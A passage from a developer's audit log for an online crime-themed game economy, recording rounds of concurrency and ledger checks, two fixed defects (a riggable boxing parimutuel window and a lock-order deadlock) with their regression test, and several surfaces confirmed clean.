  `wipeSpeakeasyAtDeath` + the `alive` filter degrade a standover/buyout on a just-died owner to a clean
  `gone`/`no_target`.
- **manual persist-clobber cross-check** — the newest direct-SQL character columns (`port_used`, `contraband`,
  `berths`, `disinfo_until`, `wire_tier`, `race_at`, `pen_faction`, `active_at`) are ALL disjoint from the
  `persistCharacter` positional set ($2–$61, `game.js:476-498`); the only positional column (`cash`) written by direct
  SQL in the newest code is the Grand Prix worker resolve (`races.js:348,379`), which uses relative `cash = cash + $2`
  under explicit `FOR UPDATE` entrant locks — the audited worker-settle pattern (no concurrent persist), no clobber.

**Design-consistent LOW notes (flagged, NOT patched per ground rule #1 — no value/exploit):** `rendezvous` gates only
`jailed` (not hospitalized/safehoused) — consistent with P1.3 since it moves no value and targets the boat not a char;
`bottleService` doesn't gate `isShut` — a pure deflationary $OMR burn / status bump at a dark club, no owner
interaction; standover/buyout don't gate the OWNER's jailed/safehoused state — the owner is PAID (a compensated
transfer, not a lethal attack), consistent with a safehoused player staying jumpable + a jailed seller's listing being
honorable.

**Round 33 verdict:** the two newest two-party-PvP surfaces (Port piracy, the Speakeasy standover/buyout/table family)
and the systematic persist-clobber cross-check all confirmed CLEAN; three design-consistent LOW notes recorded, none
patched. Suite 34/34 + sim drift-0 (unchanged — docs-only round).

## Round 34 — the boxing title-belt/main-event concurrency + a cross-system passive-accrual §10.4 hunt

Two fresh lenses over surfaces no dedicated loop lens had hit: (1) THE FIGHT CIRCUIT title-belt singleton +
main-event escrow + the step-five callout (belt result shared across `fightBout`/`resolveMainEvent`/
`acceptCallout`/`callOutChamp`/`enforceBeltDefense`/`wipeFighterAtDeath`); (2) a cross-system passive-income
accrual + §10.4 + double-accrue hunt over every newest lazy-income collect path (port/speakeasy/territory/
world-frontier/business + the §7.1 accrual engine); plus a manual lens on the chain reserve accounting
(`cancelQueuedWithdraw` vs drainQueue/markClaimed/reclaim).

**Two confirmed defects FIXED (one HIGH, one MED), regression added for the HIGH:**

**HIGH — the main-event parimutuel was riggable ("frozen form" thawed before settlement).** The whole
spectator-betting design rests on a booked fighter's form being frozen so the crowd bets on a fixed matchup.
But the freeze key `booked_until` was set == `resolves_at` (= now + `MAIN_EVENT_MS` 30 min), while settlement
is deferred to the worker sweep which runs HOURLY (`worker.js:308`, `3600*1000`). So in the ≥30-min gap
between betting-close and the next hourly sweep, `booked(f)` returns false (`boxing.js:16`) — `trainFighter`/
`fightBout`/`exhibitionBout` no longer throw `booked` — and `resolveMainEvent` re-read the fighters' LIVE
form (`boxing.js:443-447`). A manager (or an accomplice betting on their fighter) could train the booked
fighter up toward `STAT_CAP` in the gap, flip the result, and siphon the honest bettors' opposing pool.
§10.4-clean (a redistribution — the `boxing bet escrow` check still reconciles) but it defeats the feature's
core fairness premise on every card during ordinary operation (the 1h worker interval ≫ the 30-min window
guarantees the mutable gap). **Fix (the Grand-Prix/stakes/futurity snapshot precedent):** each fighter's base
form is now SNAPSHOTTED into the bout row at booking (`boxing_bouts.a_form`/`b_form`, set in BOTH
`announceMainEvent` and `acceptCallout`) and `resolveMainEvent` rolls from the snapshot, not live stats
(`bout.a_form ?? form(fa)` — a fallback keeps any pre-migration bout resolvable). Worker latency is now
irrelevant. The two new columns are auto-added on an in-place upgrade by the R30 MED-1 column migration.
**Regression** (`test/boxing.js`): the bout stores the snapshot at booking; then David's LIVE stats are
maxed post-bell — a live read would flip every payout, but the snapshot keeps Goliath the winner (all the
existing payout assertions hold).

**MED — `wipeFighterAtDeath` inverted the belt lock order (title→fighter) → AB-BA vs `acceptCallout`.**
`wipeFighterAtDeath` locked `boxing_title FOR UPDATE` (`boxing.js:631`) then `DELETE FROM fighters` (`:636`,
which row-locks the victim's fighters) — title→fighter, the inverse of the canonical fighter→title order that
`acceptCallout` uses (it locks the champ's fighter + the challenger's `callout_fighter` it does NOT char-own,
then the title). A fire-kill of the challenger (holding their char → runEstate → wipeFighterAtDeath) racing
the champ's `acceptCallout` was a circular wait (40P01, masked by the `contention` retry). **Fix:**
`wipeFighterAtDeath` now DELETEs the fighters FIRST (acquiring the fighter row-locks) then locks the title —
fighter→title, matching every other belt path; the belt/callout vacate keys on the dead CHARACTER so it's
unaffected by the fighter rows already being gone.

**Verified CLEAN (each traced to source):**
- **boxing bet escrow §10.4** reconciles on every terminal state (resolved / one-sided-book refund / all-dead
  burn / cancelBout); the vig is the audited `casino:pvp` NULL-take mechanism (burned from the pot, never
  minted on top); the F1 (fighter→title→street_tax in fightBout) and F2 (acceptCallout sorted fighter locks +
  TOCTOU re-verify) fixes hold; a vacant belt can be claimed by only one concurrent winner (`applyBeltResult`
  serializes on the title lock); the exhibition purse always burns the fee before the roll + pays once under
  the `exhib_at` cooldown; `boxing_wins` is a direct-SQL account-level legend (no persistAccount clobber);
  fighter records use absolute-INT writes; the legend is loser-level-gated on both PvP + main-event paths.
- **passive-accrual §10.4** — all six newest collect paths (port collectRun/fence/harborToll, speakeasy
  collect+upkeep, territory collect+raid+muscle+fortify, world collectFrontier+raidNpc, business collect+
  upkeep+launder, and the §7.1 accrual engine) ledger exactly what they credit, reset the clock under a row
  lock (only when income > 0), cap the window (continuous token buckets, no boundary-2× bug), and never
  ledger seized income; staking's uncapped `rewards` accrual is safe (outside `omrBuckets`, pool-gated
  `stake:reward` transfer — inflates only a claim number, never mints). One deviation confirmed still present
  — `upgradeRacket` doesn't resolve the Bureau raid before banking pending (unlike upgradeBusiness/
  upgradeSpeakeasy) — but it's NOT a §10.4 break (the income is correctly ledgered; only a sink+seize is
  dodged) and is already an explicitly-documented founder-sign-off item (the `upgradeSpeakeasy` parity dial in
  AUDIT-session-drops-2.md); NOT patched (ground rule #1 — a balance change, founder's call).
- **chain `cancelQueuedWithdraw`** locks `account_persistent` then `chain_reserve FOR UPDATE` (serializing
  with `drainQueue`) and guards `status='queued'` inside that critical section — so cancel and drainQueue
  can't both act on the same voucher (the first flips the status; the other no-ops); the refund is a net-0
  `+withdraw:omr` credit; no double-refund, no signed-voucher refund, no AB-BA (drainQueue locks only the
  reserve).

**Round 34 verdict:** one HIGH riggable-parimutuel (booked form now snapshotted at booking — worker latency
can't rig it) + one MED belt lock-order inversion (wipeFighterAtDeath now fighter→title) FIXED, HIGH
regression added; the passive-accrual §10.4 sweep + the chain reserve accounting confirmed CLEAN. Suite 34/34
+ sim drift-0.
